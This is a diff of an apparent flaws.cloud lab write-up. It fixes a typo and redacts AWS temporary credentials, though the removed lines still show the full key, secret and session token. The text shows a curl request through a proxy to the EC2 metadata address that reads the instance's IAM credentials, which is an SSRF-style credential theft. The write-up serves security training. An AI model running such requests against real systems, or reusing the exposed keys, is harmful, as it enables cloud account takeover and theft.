@@ -118,15 +118,15 @@ Trying to `curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/prox
 latest
 ```
 
-Looking at `latest`first and foremost, we can grab ourselves some EC2 security credentials for the instance by doing `curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws`
+Looking at `latest` first and foremost, we can grab ourselves some EC2 security credentials for the instance by doing `curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws`
 ```json
 {
   "Code" : "Success",
   "LastUpdated" : "2024-08-31T04:48:31Z",
   "Type" : "AWS-HMAC",
-  "AccessKeyId" : "ASIA6GG7PSQGXC644RFS",
-  "SecretAccessKey" : "zE+zVYoFeYpMXZSF0i+L2kRIYLRfdEAOQKeZWSVO",
-  "Token" : "IQoJb3JpZ2luX2VjEFUaCXVzLXdlc3QtMiJHMEUCIHPkaK+F/utA0oRysw/pC3VnAzK9HyhKv3cP/5EnNEhZAiEAnO20Cjh2NXZncvWqed+mjwCL/KkK2QFQ3WL/UdBQ/KIqsgUIbhAEGgw5NzU0MjYyNjIwMjkiDNnobQ4Y80NNnlGS9CqPBYSzWbHQ82zJqx77E9Z1QV3hebr6riGX47xQwFRNgX1mobxkZDrlXVNyDnDHRepIxA4Oyeh07Y9f6cVpf6r71boq8M2fyoM0YYrUDtrI5tmStFc9qPgkRs0HRY3OU1+w3wYZ1rz1pmWY+CwJLiI8omc8OqE6838bfmXK9hYY+i6g019mIu/NNekLA27p1Ca4ZeXxvLkggaa37nMCV4T29S1Fk3DBiNGJH21+CKX2MJUlAlvmd+TWrL4WCtFpGnsshYx3IJn155yGQLVG0Ly7GKLeIsf25LLNDz6O0pLZMERvwoTTe/RNf7KkueWG+hMnGmdnQq7nGmk5/pYMGbOB/imfrQi762sjwSlAWiWQxPuYUQUaf12D3psvEXPQrUrbiwlbz81E8IRTrY2I0nVJKzASML3fPCsmrbkwgbs85/pAteO6SCECL33diPmmiGOS7fT/lZumNWvwddpemXCsKmQB2X81/Irnz4IUGUzNCDn8j+gpT16IGgP1ZDtGxngs82mjVfi0CsYgkqU4uKjfVsOwoNGCLCVWlcDi/61Ridndd4gfaV4upOEiJFhi1HRls8sPyGKJn+zvl0BFeS2kSNfz3eLUzwvKomf2IkzBesrUI0Ev65R15AO1rm+ptO9cPrmL82OnPpHoGqTexDH36ibkmE1xSSyI30/ybzA31a4RYYXXvPx31oP0cjLZJf5Ra8jaShgGAT07//LDas5kG3r7rWuCeDhMUqbY+1ZUQJOkBaVjKGyowDNFxOyJAHaypYUJP8GIEzjbifbiJRHYcyMyi53yYXKCu9cRIl8Pie9zR+exjqLIfJzbIhm82P7MSLECwulXPjHkBjp42JrFDwfQzX33ao1t9kSpc5QP+Dww58DKtgY6sQFMg5Pd7zXctNMgFqo9gmzDg0L2sCu0sifSYX/weTSWeRDFQ7mjwQPlyXrpgw7c7OHJOdxtp4Onm5Lze2ftVFOP2uLsPXkQbFC5eoeqoBqZYHE9m1WEKaj8d5wYHwijDWuPsXW3dek2csHlfQGCzpsF3g8JqjJNFh4aaHHFseaJH124/Ccl8lGszcppEP1RZq4CU3z/xS/NADX74T11OXVtcSfSqPy1t/dG8zyaofhu2kA=",
+  "AccessKeyId" : [REDACTED],
+  "SecretAccessKey" : [REDACTED],
+  "Token" : [REDACTED],
   "Expiration" : "2024-08-31T10:55:18Z"
 }
 ```
